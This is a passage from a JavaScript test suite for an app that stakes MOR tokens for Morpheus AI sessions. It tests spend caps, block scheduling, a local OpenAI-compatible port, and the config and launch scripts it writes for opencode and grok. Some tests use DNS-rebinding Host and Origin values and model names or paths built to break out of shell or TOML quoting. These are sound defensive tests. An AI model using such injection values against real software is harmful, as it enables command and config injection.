      // sub-minimum remainders are (correctly) refused.
      if (sec - w.coverTo >= MIN_REQUEST_SECONDS) uncovered ??= { sec, coverTo: w.coverTo };
    }
    ok(`${mode} @7d: priced blocks == blocks actually opened`,
      mismatch === null, mismatch && JSON.stringify(mismatch));
    ok(`${mode} @7d: the run covers the length sold, to within one contract minimum`,
      uncovered === null, uncovered && JSON.stringify(uncovered));
  }
  // A session AT or UNDER the cap is one block — the whole point of the change.
  // If this ever prices >1, a 1-day session silently became a chain of stakes.
  ok('a session at the cap is exactly one block',
    blocksForDuration(CAP, true, CAP) === 1 &&
    blocksForDuration(CAP, false, CAP) === 1);
  ok('a 1-day session bought as one block prices 1',
    blocksForDuration(86400, true, 86400) === 1 &&
    blocksForDuration(86400, false, 86400) === 1);
  // 2 years is the operator's own example. It must be a finite, sane plan.
  const twoYears = blocksForDuration(2 * 365 * 24 * 60 * 60, false, CAP);
  ok(`2 years chains ${twoYears} week-long sessions (>100, <120)`,
    twoYears > 100 && twoYears < 120);
  // The default argument is what keeps every pre-existing caller correct.
  ok('blockSeconds defaults to the 305s floor',
    blocksForDuration(3600, true) === blocksForDuration(3600, true, MIN_REQUEST_SECONDS) &&
    strideSeconds(true) === strideSeconds(true, MIN_REQUEST_SECONDS));
}

// ---- a chained run must not stay staked past what was asked for --------------
// Adversarial review finding (HIGH): the final block used to be a full cap-sized
// one, so an 8-day ask committed MOR for ~14 days and a 14-day ask bought THREE
// week-long stakes because a 25-second overlap remainder pulled in another whole
// block. The user's escape from that is an early close, which time-locks stake
// for ~24h — so the overshoot is not merely idle capital, it is expensive to undo.
//
// The rule now: cut the last block to the remainder, and DROP a remainder shorter
// than the contract minimum rather than round it up to a whole block.
console.log('');
console.log('queries: a chained run stops at the length that was sold');
{
  const CAP = 7 * 24 * 60 * 60;
  const DAY = 24 * 60 * 60;
  // Where the run's cover actually ends, walking the same rule the scheduler
  // walks (planBlocks returns the lengths; this re-derives the wall-clock end).
  const coverEnd = (targetSec, overlap, unit) => {
    const lens = planBlocks(targetSec, overlap, unit);
    let endsAt = lens[0];
    for (let i = 1; i < lens.length; i++) {
      const fireAt = overlap ? endsAt - OVERLAP_SEC : endsAt + CLOSE_BUFFER_SEC;
      endsAt = fireAt + lens[i];
    }
    return endsAt;
  };

  // Scanned at BOTH units and every second in the small-unit range, not just
  // whole days at the cap. Re-review caught the earlier version overclaiming
  // "0s worst case": economy can genuinely overshoot by up to CLOSE_BUFFER_SEC
  // at the 305s unit (targetSec - fireAt lands at 297..304 and is lifted to
  // 305). The claim that matters is the BOUND — under one contract minimum —
  // not a zero, so scan wide enough to see the real worst case and assert that.
  for (const overlap of [true, false]) {
    const mode = overlap ? 'seamless' : 'economy';
    let worst = { sec: 0, over: -Infinity, unit: 0 };
    const see = (sec, unit) => {
      const over = coverEnd(sec, overlap, unit) - sec;
      if (over > worst.over) worst = { sec, over, unit };
    };
    // Whole days from just past the cap to two years, at the 7-day unit.
    for (let sec = CAP + DAY; sec <= 730 * DAY; sec += DAY) see(sec, CAP);
    // Every second across several blocks at the 305s unit — this is where the
    // close-buffer overshoot actually lives.
    for (let sec = MIN_REQUEST_SECONDS; sec <= 4000; sec += 1) {
      see(sec, MIN_REQUEST_SECONDS);
    }
    ok(`${mode}: never staked a whole block past the ask (worst ${worst.over}s at unit ${worst.unit})`,
      worst.over < MIN_REQUEST_SECONDS, JSON.stringify(worst));
  }

  // The arithmetic behind a UI defect re-review found: just past the cap the
  // remainder is under the contract minimum and gets dropped, so the plan is
  // still ONE block. "Longer than one session" and "renews" are different
  // questions in a 304-second window, and the UI must ask the second one.
  ok('just past the cap is still a single block',
    blocksForDuration(CAP + 1, true, CAP) === 1 &&
    blocksForDuration(CAP + MIN_REQUEST_SECONDS - 1, true, CAP) === 1);
  ok('a full contract minimum past the cap does chain',
    blocksForDuration(CAP + MIN_REQUEST_SECONDS, true, CAP) === 2);

  // The two cases the reviewer measured, by name.
  ok('8 days is 2 blocks, not 2 blocks running 14 days',
    planBlocks(8 * DAY, true, CAP).length === 2 &&
    coverEnd(8 * DAY, true, CAP) === 8 * DAY);
  ok('14 days seamless is 2 week-blocks, not 3',
    planBlocks(14 * DAY, true, CAP).length === 2);
  ok('the 25s remainder is dropped, not rounded up to another week',
    14 * DAY - coverEnd(14 * DAY, true, CAP) === OVERLAP_SEC);
  // Under-delivery is bounded too: stopping early is the cheap direction, but it
  // must be seconds, never hours.
  ok('a dropped remainder is under 5 minutes short, never more',
    14 * DAY - coverEnd(14 * DAY, true, CAP) < MIN_REQUEST_SECONDS);

  // The last block really is shorter — the fix, not just the count.
  const eightDay = planBlocks(8 * DAY, true, CAP);
  ok('the final block is the remainder, not a full unit',
    eightDay[0] === CAP && eightDay[1] < CAP && eightDay[1] === 8 * DAY - (CAP - OVERLAP_SEC));

  // A session inside the cap is untouched by any of this.
  ok('a session inside the cap is still exactly one full-length block',
    planBlocks(DAY, true, DAY).length === 1 &&
    planBlocks(DAY, true, DAY)[0] === DAY &&
    coverEnd(DAY, true, DAY) === DAY);
  ok('every planned block is at least the contract minimum',
    planBlocks(2 * 365 * DAY, false, CAP).every((l) => l >= MIN_REQUEST_SECONDS));
  ok('blocksForDuration is just the plan length',
    blocksForDuration(8 * DAY, true, CAP) === planBlocks(8 * DAY, true, CAP).length);

  // The 305s path the old rolling behaviour used must be unchanged.
  ok('the default unit still prices a single minimum block as 1',
    planBlocks(MIN_REQUEST_SECONDS, true).length === 1 &&
    planBlocks(MIN_REQUEST_SECONDS, false).length === 1);
}

// ---- the OpenAI-compatible facade -------------------------------------------
// This is a local HTTP port. Its admission checks are the security boundary, so
// they are pinned adversarially rather than happy-path.
//
// The posture worth restating: the port is spend-inert by default (it never
// opens a blockchain session unless explicitly enabled), because auth cannot
// defend against same-user local malware. These checks cover the attackers auth
// CAN stop: a web page, a rebinding host, and a wrong or absent key.
console.log('');
console.log('openai-compat: who is allowed to talk to the port');
{
  const TOKEN = 'mor-sk-0123456789abcdef0123456789abcdef';
  const PORT = 8137;
  const ok_ = (h) => admitRequest(h, TOKEN, PORT);
  const good = { authorization: `Bearer ${TOKEN}`, host: `127.0.0.1:${PORT}` };

  ok('a correct key over loopback is admitted', ok_(good).ok === true);
  ok('localhost:<port> is loopback too',
    ok_({ ...good, host: `localhost:${PORT}` }).ok === true);
  ok('IPv6 loopback is accepted', ok_({ ...good, host: `[::1]:${PORT}` }).ok === true);
  ok('bearer is case-insensitive (clients differ)',
    ok_({ ...good, authorization: `bearer ${TOKEN}` }).ok === true);

  // The key.
  ok('no Authorization header is refused', ok_({ ...good, authorization: null }).status === 401);
  ok('a wrong key is refused', ok_({ ...good, authorization: 'Bearer nope' }).status === 401);
  ok('Basic auth is not a bearer token', ok_({ ...good, authorization: 'Basic abc' }).status === 401);
  ok('an empty bearer is refused', ok_({ ...good, authorization: 'Bearer ' }).status === 401);
  // A prefix of the real key must not pass — the guard against a sloppy
  // startsWith/substring comparison.
  ok('a prefix of the key is refused',
    ok_({ ...good, authorization: `Bearer ${TOKEN.slice(0, -1)}` }).status === 401);

  // DNS rebinding: the attacker's page resolves their hostname to 127.0.0.1, so
  // binding to loopback does NOT keep them out — the Host header does.
  ok('a rebinding Host is refused', ok_({ ...good, host: 'evil.example' }).status === 403);
  ok('a rebinding Host on the right port is still refused',
    ok_({ ...good, host: `evil.example:${PORT}` }).status === 403);
  ok('a missing Host is refused', ok_({ ...good, host: null }).status === 403);
  ok('loopback on the WRONG port is refused',
    ok_({ ...good, host: `127.0.0.1:${PORT + 1}` }).status === 403);

  // Browsers always send Origin cross-origin; CLI tools never do.
  ok('any Origin is refused', ok_({ ...good, origin: 'https://evil.example' }).status === 403);
  ok('Origin is refused even WITH a valid key (a leaked key in a page)',
    ok_({ ...good, origin: 'http://localhost:3000' }).ok === false);
  // Order matters: Origin is checked before the key, so a page cannot use a
  // stolen token even once.
  ok('Origin outranks a bad key (checked first)',
    ok_({ authorization: 'Bearer wrong', host: 'evil.example', origin: 'https://e.x' }).code === 'origin_not_allowed');

  ok('constant-time compare still returns the right answer',
    bearerMatches(TOKEN, TOKEN) === true &&
    bearerMatches(TOKEN + 'x', TOKEN) === false &&
    bearerMatches('', TOKEN) === false &&
    bearerMatches(TOKEN, '') === false);
}

console.log('');
console.log('openai-compat: models a client can actually use');
{
  const local = { id: '0xaaa1', name: 'llama-3-8b', isLocal: true };
  const remote = { id: '0xbbb2', name: 'deepseek-v4', isLocal: false, sessionId: '0xsess' };
  const dupA = { id: '0xccc3333333', name: 'shared-name', isLocal: false, sessionId: '0xs1' };
  const dupB = { id: '0xddd4444444', name: 'shared-name', isLocal: false, sessionId: '0xs2' };

  const list = toModelList([local, remote], 1700000000);
  ok('the list is OpenAI-shaped', list.object === 'list' && Array.isArray(list.data));
  ok('entries carry the required fields',
    list.data.every((e) => e.id && e.object === 'model' && typeof e.created === 'number' && e.owned_by));
  ok('unique names are advertised bare', list.data.some((e) => e.id === 'llama-3-8b'));
  ok('local vs marketplace is distinguishable',
    list.data.find((e) => e.id === 'llama-3-8b').owned_by === 'morpheus-local' &&
    list.data.find((e) => e.id === 'deepseek-v4').owned_by === 'morpheus-marketplace');

  // Morpheus names are NOT unique; OpenAI clients treat `model` as a key.
  const dupList = toModelList([dupA, dupB], 1700000000);
  ok('colliding names are disambiguated, not deduped',
    dupList.data.length === 2 && new Set(dupList.data.map((e) => e.id)).size === 2);
  ok('and the disambiguated form resolves back',
    resolveModel(dupList.data[0].id, [dupA, dupB]).ok === true);

  // Resolution.
  ok('a bare unique name resolves', resolveModel('llama-3-8b', [local, remote]).model.id === '0xaaa1');
  ok('a raw hex id always resolves', resolveModel('0xbbb2', [local, remote]).model.id === '0xbbb2');
  ok('hex resolution is case-insensitive', resolveModel('0xBBB2', [local, remote]).ok === true);
  ok('an empty model is refused', resolveModel('', [local, remote]).code === 'model_required');
  ok('an unknown model lists what IS available',
    /llama-3-8b/.test(resolveModel('gpt-4', [local, remote]).message));

  // The important refusal: never silently pick one of two same-named models —
  // that would route the prompt, and a marketplace model's staked capacity, at
  // a provider the user did not choose.
  const amb = resolveModel('shared-name', [dupA, dupB]);
  ok('an ambiguous bare name is REFUSED, not guessed', amb.ok === false && amb.code === 'model_ambiguous');
  ok('and the refusal names the alternatives', /shared-name:/.test(amb.message));

  // Routing headers: the router routes from headers only.
  ok('a local model sends model_id and NO session_id',
    routingHeaders(local).model_id === '0xaaa1' && !('session_id' in routingHeaders(local)));
  ok('a remote model sends its session_id',
    routingHeaders(remote).session_id === '0xsess');

  ok('errors use the OpenAI envelope', (() => {
    const e = JSON.parse(errorBody('nope', 'model_not_found'));
    return e.error && e.error.message === 'nope' && e.error.code === 'model_not_found';
  })());
}

// ---- the spend caps ----------------------------------------------------------
// These are the enforcement behind /start. The TUI confirmation stops the AGENT
// (a model cannot press a key); these stop everything else — a plugin bug, a
// mis-parsed duration, a loop that skips the dialog. They live in the app and
// cannot be raised over the wire, so they are the last line before a real
// transaction.
console.log('');
console.log('sessions: spend caps are the enforcement, not the dialog');
{
  const caps = { maxStakeMor: 10, maxDailyStakeMor: 25 };
  const now = Date.UTC(2026, 7, 6, 15, 0, 0);
  const noLedger = [];

  ok('a stake inside both limits is allowed',
    checkCaps(5, caps, noLedger, now).allowed === true);
  ok('a stake over the per-session cap is refused',
    checkCaps(11, caps, noLedger, now).allowed === false);
  ok('and the refusal names the limit that bound',
    /per-session limit of 10 MOR/.test(checkCaps(11, caps, noLedger, now).reason));
  ok('exactly at the cap is allowed (a ceiling, not a fence)',
    checkCaps(10, caps, noLedger, now).allowed === true);

  // The daily ledger.
  const today = [
    { at: now - 3600_000, stakeMor: 9, sessionId: 'a' },
    { at: now - 7200_000, stakeMor: 8, sessionId: 'b' },
  ];
  ok("today's spend accumulates", spentToday(today, now) === 17);
  ok('a stake that would breach the DAILY cap is refused',
    checkCaps(9, caps, today, now).allowed === false);
  ok('and that refusal names the daily limit and what is already spent',
    /daily limit of 25 MOR/.test(checkCaps(9, caps, today, now).reason) &&
    /17\.00 already staked/.test(checkCaps(9, caps, today, now).reason));
  ok('a stake that fits under the daily cap is allowed',
    checkCaps(8, caps, today, now).allowed === true);

  // Yesterday's spend must not count against today, or the cap ratchets shut.
  const yesterday = [{ at: now - 30 * 3600_000, stakeMor: 24, sessionId: 'old' }];
  ok('yesterday does not count against today',
    spentToday(yesterday, now) === 0 &&
    checkCaps(9, caps, yesterday, now).allowed === true);

  // Degenerate prices must FAIL CLOSED — an unpriceable session is exactly the
  // case where an unbounded amount could be staked.
  ok('an unpriceable stake is refused', checkCaps(NaN, caps, noLedger, now).allowed === false);
  ok('a zero stake is refused', checkCaps(0, caps, noLedger, now).allowed === false);
  ok('a negative stake is refused', checkCaps(-5, caps, noLedger, now).allowed === false);

  // The quote must match the chain's formula, or the confirmation screen lies.
  // supply/budget = 1, price 1e15 wei/s, 1 hour -> 1e15 * 3600 / 1e18 = 3.6 MOR.
  ok('the quote mirrors the router formula',
    Math.abs(stakeForDuration('1000000000000000', 3600, 1, 1) - 3.6) < 1e-9);
  ok('a zero budget does not divide by zero into a fake price',
    !Number.isFinite(stakeForDuration('1000000000000000', 3600, 1, 0)));

  // The catalog drops models nothing can serve — a picker entry that cannot
  // open a session is a dead end the user pays attention to for nothing.
  const catalog = buildCatalog(
    [{ Id: '0xm1', Name: 'has-providers' }, { Id: '0xm2', Name: 'no-providers' }],
    new Map([['0xm1', [{ Id: '0xb1', Provider: '0xp1', PricePerSecond: '1000000000000000' }]]]),
    1,
    1,
  );
  ok('the catalog lists only models with a provider',
    catalog.length === 1 && catalog[0].name === 'has-providers');
  ok('and quotes an hourly price a human can read',
    Math.abs(catalog[0].providers[0].stakeMorPerHour - 3.6) < 1e-9);
}

// ---- opencode handoff --------------------------------------------------------
// The app writes an opencode config and builds a shell line that a terminal runs.
// Two things must hold: the config matches what opencode expects (or the handoff
// silently does nothing), and the shell line is safe for arbitrary model names —
// anyone can register a model on-chain with any name they like, and that name
// ends up in a command.
console.log('');
console.log('opencode: the config and the command we hand a terminal');
{
  const cfg = JSON.parse(buildMorpheusConfig({
    baseUrl: 'http://127.0.0.1:8137/v1',
    apiKey: 'mor-sk-secret',
    models: [
      { id: 'deepseek-v4', label: 'DeepSeek V4' },
      { id: 'local-llama', label: 'Local Llama' },
    ],
  }));

  ok('it declares the generic OpenAI-compatible adapter',
    cfg.provider.morpheus.npm === '@ai-sdk/openai-compatible');
  ok('it points at our local endpoint',
    cfg.provider.morpheus.options.baseURL === 'http://127.0.0.1:8137/v1');
  ok('it carries the endpoint key', cfg.provider.morpheus.options.apiKey === 'mor-sk-secret');
  // opencode requires model keys to equal the ids from GET /v1/models; if these
  // drift the provider appears but every model 404s.
  ok('model keys are the ids /v1/models advertises',
    Object.keys(cfg.provider.morpheus.models).sort().join(',') === 'deepseek-v4,local-llama');
  ok('models carry a human label', cfg.provider.morpheus.models['deepseek-v4'].name === 'DeepSeek V4');

  // ---- the /start plugin, declared as a [path, options] tuple ----
  // The token reaches the plugin as DATA. Writing it into the plugin SOURCE
  // would mean every rewrite of that file is another copy of a live credential
  // on disk, and a plugin that is byte-identical for every user cannot leak
  // one at all.
  ok('no plugin is declared when none is shipped', cfg.plugin === undefined);

  const withPlugin = JSON.parse(buildMorpheusConfig({
    baseUrl: 'http://127.0.0.1:8137/v1',
    apiKey: 'mor-sk-secret',
    models: [{ id: 'deepseek-v4', label: 'DeepSeek V4' }],
    pluginPath: '/Users/x/Library/Application Support/app/opencode/morpheus-start.js',
  }));
  ok('the plugin is declared as a [path, options] tuple',
    Array.isArray(withPlugin.plugin) && Array.isArray(withPlugin.plugin[0]) &&
    withPlugin.plugin[0].length === 2);
  ok('the tuple names the plugin file',
    withPlugin.plugin[0][0].endsWith('morpheus-start.js'));
  ok('the plugin is given the endpoint ORIGIN, not the /v1 path — it talks to /morpheus/v1',
    withPlugin.plugin[0][1].baseUrl === 'http://127.0.0.1:8137');
  ok('the plugin is handed the token as options, not baked into its source',
    withPlugin.plugin[0][1].apiKey === 'mor-sk-secret');
  const providerSrc = buildProviderPlugin('/tmp/endpoint.json');
  ok('the generated plugin carries no credential', !/mor-sk-/.test(providerSrc));
  ok('it reads the descriptor path it was built with', providerSrc.includes('"/tmp/endpoint.json"'));
  ok('the placeholder is fully substituted', !providerSrc.includes('__MORPHEUS_DESCRIPTOR__'));
  ok('a hostile descriptor path stays inside its literal',
    buildProviderPlugin('/tmp/a"b.json').includes(String.raw`"/tmp/a\"b.json"`));
  // The generated files must still contain a REAL import — the source cannot,
  // because vite's scanner reads a literal `import ... from '...'` inside a
  // template literal as an import of the MAIN BUNDLE and flips its module
  // interop, which emitted `require(...)` into an .mjs and stopped the whole
  // app from loading with "require is not defined in ES module scope".
  ok('the generated plugin imports fs for real',
    /import \{ readFileSync \} from 'node:fs';/.test(providerSrc));
  ok('but the SOURCE never contains one inside a template',
    !/^import .* from '(node:)?fs'/m.test(
      readFileSync(new URL('../../src/main/src/opencode/start-plugin.ts', import.meta.url), 'utf8')
        .split('String.raw`').slice(1).join('String.raw`')));
  ok('the provider plugin registers a config hook', /config: async \(config\)/.test(providerSrc));
  ok('the provider plugin only ever adds its own key',
    /config\.provider\.morpheus =/.test(providerSrc));
  // A path with a space (Application Support) must survive JSON round-trip
  // intact — it is read by opencode, not by a shell, so it must NOT be quoted.
  ok('a path containing spaces is stored verbatim',
    withPlugin.plugin[0][0].includes('Application Support'));

  // ---- Morpheus models in grok's picker --------------------------------------
// The simple half of the integration: USING a session needs only a provider
// entry in a documented config file. This is what replaced intercepting a
// keystroke on grok's internal socket.
console.log('');
console.log('grok: models published into the managed config');
{
  const cfg = buildGrokModelsToml({
    baseUrl: 'http://127.0.0.1:8137/v1',
    apiKey: 'mor-sk-secret',
    models: [
      { id: 'deepseek-v4', label: 'deepseek-v4 (session)' },
      { id: '0xabc123', label: '0xabc123 (local)' },
    ],
  });

  ok('each model gets an entry', /\[model\.morpheus-deepseek-v4\]/.test(cfg));
  ok('and it is prefixed, so it cannot collide with the user\'s own',
    !/\[model\.deepseek-v4\]/.test(cfg));
  ok('the model field is the id the endpoint advertises, not our key',
    /model = "deepseek-v4"/.test(cfg));
  ok('pointed at the endpoint', /base_url = "http:\/\/127\.0\.0\.1:8137\/v1"/.test(cfg));
  ok('with the key on the model itself (a loopback model_provider fails closed)',
    /api_key = "mor-sk-secret"/.test(cfg));
  ok('and the OpenAI chat-completions backend', /api_backend = "chat_completions"/.test(cfg));
  // The credential that actually survives the trip. grok swaps api_key for its
  // own IdP session token on any endpoint it reads as first-party xAI — which
  // a 127.0.0.1 URL always is — so the key has to travel in a header it does
  // not rewrite, or every request arrives as an unexplainable 401.
  // ---- starred models: what makes the published list stand still ----
  // Every terminal agent reads its model list once, at startup. While the list
  // held exactly what had a session, it changed under them and the only remedy
  // was a restart. Starred models are the user's own set, so it changes when
  // they say so and not when a session happens to expire.
  {
    const localModel = { id: '0xlocal', name: 'qwen', isLocal: true };
    const opened = {
      id: '0xopen',
      name: 'deepseek-v4-pro',
      isLocal: false,
      sessionId: '0xsess',
    };

    ok('a starred model is advertised with no session at all',
      mergeStarredModels([localModel], ['0xstar']).some((m) => m.id === '0xstar'));
    // A merge that overwrote the session entry would turn a working model into
    // a refused one — a downgrade that costs the user a session they paid for.
    ok('a starred model that already has a session keeps it',
      mergeStarredModels([opened], ['0xopen'])
        .find((m) => m.id === '0xopen').sessionId === '0xsess');
    ok('starring the same model twice lists it once',
      mergeStarredModels([], ['0xstar', '0xstar']).length === 1);
    ok('a case difference does not create a duplicate TOML table',
      mergeStarredModels([opened], ['0xOPEN']).length === 1);
    ok('a blank id is dropped rather than published as a model',
      mergeStarredModels([], ['', '0xstar']).length === 1);
    ok('a known name is preferred to the raw chain id',
      mergeStarredModels([], ['0xstar'], new Map([['0xstar', 'pretty']]))[0].name === 'pretty');
  }

  // ---- a model with no session is refused, never routed ----
  {
    const localModel = { id: '0xlocal', name: 'qwen', isLocal: true };
    const opened = { id: '0xopen', name: 'pro', isLocal: false, sessionId: '0xsess' };
    const starved = { id: '0xstar', name: 'deepseek-v4-flash', isLocal: false };

    ok('a marketplace model with no session needs one', needsSession(starved));
    ok('a local model never needs a session', !needsSession(localModel));
    ok('a model holding a session does not need another', !needsSession(opened));

    // THE trap this closes: the router reads "no session_id" as "serve this
    // locally", so forwarding a starved model would answer from a DIFFERENT
    // model under the requested name — wrong, and shaped exactly like right.
    let threw = false;
    try {
      routingHeaders(starved);
    } catch {
      threw = true;
    }
    ok('routing a model with no session throws instead of mis-routing', threw);
    ok('routing a model WITH a session is untouched',
      routingHeaders(opened).session_id === '0xsess');
    ok('the refusal names the model the user actually typed',
      sessionRequiredMessage('deepseek-v4-flash').includes('deepseek-v4-flash'));
  }

  // ---- the offer gate: agents are concurrent, and they retry ----
  {
    let clock = 0;
    const gate = new SessionOfferGate({
      now: () => clock,
      cooldownMs: 1000,
      inFlightTtlMs: 500,
    });

    ok('the first use of a starred model is offered a session',
      gate.request('m').offer === true);
    // Measured: grok fires a hidden title-generation call alongside the real
    // turn, and both can name the same model. Two dialogs for one intent is a
    // user paying twice for one thing.
    ok('a concurrent request for the same model does not raise a second offer',
      gate.request('m').offer === false);
    ok('a different model is still offered', gate.request('other').offer === true);

    gate.settle('m', 'declined');
    ok('declining puts that model quiet', gate.request('m').reason === 'cooling_down');
    // Measured: grok reissued a failing request 8 times in 2 minutes. With no
    // cooldown, cancelling only means the window returns until you give in and
    // click the expensive button — a purchase made by fatigue.
    clock += 999;
    ok('it is still quiet a moment before the cooldown ends',
      gate.request('m').offer === false);
    clock += 2;
    ok('and offerable again once the cooldown has passed',
      gate.request('m').offer === true);

    gate.settle('m', 'opened');
    ok('opening a session clears the model outright', gate.request('m').offer === true);

    const stale = new SessionOfferGate({
      now: () => clock,
      cooldownMs: 1000,
      inFlightTtlMs: 500,
    });
    ok('an offer in flight holds the model',
      stale.request('z').offer === true && stale.request('z').offer === false);
    // A renderer that is closed or never looked at would otherwise wedge this
    // model as "asking" forever, with no way back.
    clock += 501;
    ok('an unanswered offer expires rather than wedging the model',
      stale.request('z').offer === true);
  }

  // ---- an offer raised while the app was locked ----
  // The picker host lives inside the signed-in layout, so a locked app is not
  // mounted to receive one: the window came forward on the wallet screen and
  // the offer vanished, while the gate still believed it was in flight. It is
  // queued now, and claimed when the host mounts — which is what unlocking does.
  {
    const q = (requestId, modelId, at) => [requestId, { modelId, advertised: modelId, at }];

    const fresh = claimNewestOffer([q(1, '0xa', 100), q(2, '0xb', 400)], 500, 1000);
    ok('the newest queued offer is the one shown', fresh.claim.requestId === 2);
    ok('and nothing fresh is discarded', fresh.expired.length === 0);

    // A spend prompt for a request made twenty minutes ago is an ambush.
    const old = claimNewestOffer([q(1, '0xa', 0)], 5000, 1000);
    ok('an offer past its window is not shown', old.claim === null);
    ok('and it is reported so the gate can be released', old.expired[0].modelId === '0xa');
    // Without releasing it the model stays "in flight" and can never be
    // offered again — a dead end with no way back for the user.
    ok('the expiry names the request to settle', old.expired[0].requestId === 1);

    const mixed = claimNewestOffer([q(1, '0xa', 0), q(2, '0xb', 4900)], 5000, 1000);
    ok('a stale offer does not hide a live one', mixed.claim.requestId === 2);
    ok('and the stale one is still released', mixed.expired.length === 1);

    ok('an empty queue claims nothing', claimNewestOffer([], 5000, 1000).claim === null);
  }

  // ---- what grok is told about ----
  {
    const adv = [
      { id: 'qwen2.5-1.5b-instruct', label: 'qwen (local)', isLocal: true },
      { id: 'deepseek-v4-pro', label: 'deepseek-v4-pro (session)', isLocal: false },
      { id: 'deepseek-v4-flash', label: 'deepseek-v4-flash (no session)', isLocal: false },
    ];
    const picked = selectGrokModels(adv).map((m) => m.id);
    ok('a session-backed model is published', picked.includes('deepseek-v4-pro'));
    // The redesign in one assertion: a starred model with no session is in the
    // picker, and buying it is what using it triggers.
    ok('a starred model with NO session is published too',
      picked.includes('deepseek-v4-flash'));
    // grok always sends tools AND stream; the local runtime always refuses that
    // pair. Listing it is offering a guaranteed failure.
    ok('a LOCAL model is never published to grok',
      !picked.includes('qwen2.5-1.5b-instruct'));
    ok('the order is stable, so an unchanged set rewrites an identical file',
      JSON.stringify(selectGrokModels(adv)) ===
        JSON.stringify(selectGrokModels([...adv].reverse())));
  }

  // The launch command must select the model by its CONFIG KEY: `-m` resolves
  // against grok's model map, and the raw id is not in it.
  {
    const script = buildGrokLaunchScript({
      grokPath: '/Users/x/.grok/bin/grok',
      modelId: 'qwen2.5-1.5b-instruct',
      cwd: '/tmp',
    });
    ok('grok is launched on the config key, not the raw id',
      / -m 'morpheus-qwen2-5-1-5b-instruct'/.test(script));
    ok('and the key it uses is the one the config declares',
      script.includes(grokModelKey('qwen2.5-1.5b-instruct')));
    ok('the working directory is quoted', /cd '\/tmp'/.test(script));
    // Model names are chain data and end up in a .command file.
    ok('a control character in a model id is refused, not quoted', (() => {
      try {
        buildGrokLaunchScript({ grokPath: 'g', modelId: 'a\nb', cwd: '/tmp' });
        return false;
      } catch {
        return true;
      }
    })());
    ok('a quote in a path cannot escape its argument',
      buildGrokLaunchScript({ grokPath: "/a'b/grok", modelId: 'm', cwd: '/tmp' })
        .includes(String.raw`'/a'\''b/grok'`));
  }

  ok('the key also travels in a header grok will not rewrite',
    /extra_headers = \{ "X-Morpheus-Key" = "mor-sk-secret" \}/.test(cfg));

  // It must ADD models and nothing else. This file is layered under the user's
  // config.toml, but writing a global here would still be deciding something
  // that is not ours to decide.
  ok('it never sets a default model', !/\[models\]/.test(cfg) && !/default =/.test(cfg));
  ok('it sets no other global', !/^\[(?!model\.)/m.test(cfg));

  // Model ids are CHAIN DATA — anyone can register a hostile name.
  ok('a quote in a model name cannot break out of its string',
    buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
      models: [{ id: 'a"b', label: 'x' }] }).includes(String.raw`model = "a\"b"`));
  ok('a backslash is escaped',
    buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
      models: [{ id: 'a\\b', label: 'x' }] }).includes(String.raw`"a\\b"`));
  ok('a newline in a model name is REFUSED, not encoded', (() => {
    try {
      buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k', models: [{ id: 'a\nb', label: 'x' }] });
      return false;
    } catch {
      return true;
    }
  })());
  ok('a hostile id still yields a safe bare key',
    grokModelKey('a"b/c d') === 'morpheus-a-b-c-d');

  // THE bug that shipped: a dot is TOML's TABLE SEPARATOR, so a key containing
  // one parses as nested tables. grok looked up "morpheus-qwen2", found no such
  // model, and fell through to xAI's API. Every real model id has dots in it
  // ("qwen2.5-1.5b-instruct") — the earlier fixture used "deepseek-v4" and so
  // could never have expressed the condition.
  ok('a key never contains a dot', !grokModelKey('qwen2.5-1.5b-instruct').includes('.'));
  ok('the dotted id still reaches the endpoint as the model field',
    buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
      models: [{ id: 'qwen2.5-1.5b-instruct', label: 'x' }] })
      .includes('model = "qwen2.5-1.5b-instruct"'));
  ok('and its table header is a single bare key',
    /^\[model\.morpheus-qwen2-5-1-5b-instruct\]$/m.test(
      buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
        models: [{ id: 'qwen2.5-1.5b-instruct', label: 'x' }] })));
  // No table header anywhere may contain a dot beyond the `model.` prefix.
  {
    const cfg2 = buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
      models: [{ id: 'a.b.c', label: 'x' }, { id: 'x.y', label: 'y' }] });
    const headers = cfg2.match(/^\[.*\]$/gm) ?? [];
    ok('no generated table header nests unintentionally',
      headers.every((h) => (h.match(/\./g) ?? []).length === 1), headers.join(' '));
  }
  // Ids that differ only in punctuation must not produce a duplicate table,
  // which is a parse error that would take the WHOLE file down.
  {
    const dup = buildGrokModelsToml({ baseUrl: 'u', apiKey: 'k',
      models: [{ id: 'a.b', label: '1' }, { id: 'a-b', label: '2' }] });
    const headers = dup.match(/^\[model\..*\]$/gm) ?? [];
    ok('colliding ids get distinct keys',
      headers.length === 2 && new Set(headers).size === 2, headers.join(' '));
  }

  // Endpoint off -> publish NOTHING, rather than leaving a stale list that
  // offers models which cannot answer.
  const empty = buildGrokModelsToml({ baseUrl: '', apiKey: '', models: [] });
  ok('an empty list publishes no models', !/\[model\./.test(empty));
  ok('and says why, so the file is not a mystery', /open a session in the app/i.test(empty));
  ok('and leaks no token when there is nothing to serve', !/mor-sk-/.test(empty));
}

// ---- the grok IPC chain is COMPLETE ----------------------------------------
// A severed IPC chain typechecks and builds cleanly: `client` is `any` through
// the HOC, so a missing method is invisible until someone uses the feature.
// That is exactly how the whole grok bridge was lost once — a concurrent editor
// reverted four files, every gate stayed green, and the shipped app had a picker
// nothing could reach. Assert the three links of each channel exist together.
{
  const read = (rel) =>
    readFileSync(new URL(rel, import.meta.url), 'utf8');
  const handlersSrc = read('../../src/main/src/client/subscriptions/handlers.ts');
  const listenersSrc = read('../../src/main/src/client/subscriptions/index.ts');
  const clientSrc = read('../../src/renderer/src/client/index.ts');

  // ONE list, so a fourth channel added later cannot half-land.
  const CHANNELS = [
    ['get-grok-status', 'getGrokStatus'],
    ['set-grok-enabled', 'setGrokEnabled'],
    ['grok-picker-done', 'grokPickerDone'],
    // Added when a locked app proved it could swallow an offer whole: the
    // picker host is inside the signed-in layout, so it is not mounted to
    // receive one until the user unlocks.
    ['get-pending-session-offer', 'getPendingSessionOffer'],
  ];
  for (const [ipcName, fnName] of CHANNELS) {
    ok(`${ipcName}: main exports its handler`,
      new RegExp(`export const ${fnName}\\b`).test(handlersSrc));
    ok(`${ipcName}: registered in the listeners map`,
      listenersSrc.includes(`'${ipcName}': handlers.${fnName}`));
    ok(`${ipcName}: the renderer binds it`,
